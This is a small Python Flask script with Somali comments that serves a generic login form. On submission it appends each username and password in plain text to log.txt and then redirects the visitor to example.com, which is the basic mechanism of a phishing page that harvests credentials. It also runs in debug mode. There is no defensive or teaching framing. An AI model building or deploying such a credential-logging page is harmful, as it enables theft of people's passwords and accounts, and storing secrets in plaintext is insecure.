from flask import Flask, request, redirect

app = Flask(__name__)

# Bogga hore
@app.route('/')
def login_page():
    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login</title>
        <script>
            function copyToClipboard() {
                var url = document.getElementById("url");
                navigator.clipboard.writeText(url.innerText).then(() => {
                    alert("URL copied to clipboard!");
                });
            }
        </script>
    </head>
    <body>
        <h2>Login Page</h2>
        <form action="/submit" method="post">
            <label for="username">Username:</label><br>
            <input type="text" id="username" name="username" required><br><br>
            <label for="password">Password:</label><br>
            <input type="password" id="password" name="password" required><br><br>
            <button type="submit">Login</button>
        </form>
        <br>
        <h3>Manual URL</h3>
        <p id="url">http://127.0.0.1:5000/submit</p>
        <button onclick="copyToClipboard()">Copy URL</button>
    </body>
    </html>
    '''

# Bogga xogta laga gudbiyo
@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']

    # Keydinta xogta
    with open("log.txt", "a") as file:
        file.write(f"Username: {username}\n")
        file.write(f"Password: {password}\n")
        file.write("---------------------\n")

    # Dib u celinta user-ka bog kale
    return redirect("https://example.com")

if __name__ == "__main__":
    app.run(debug=True)
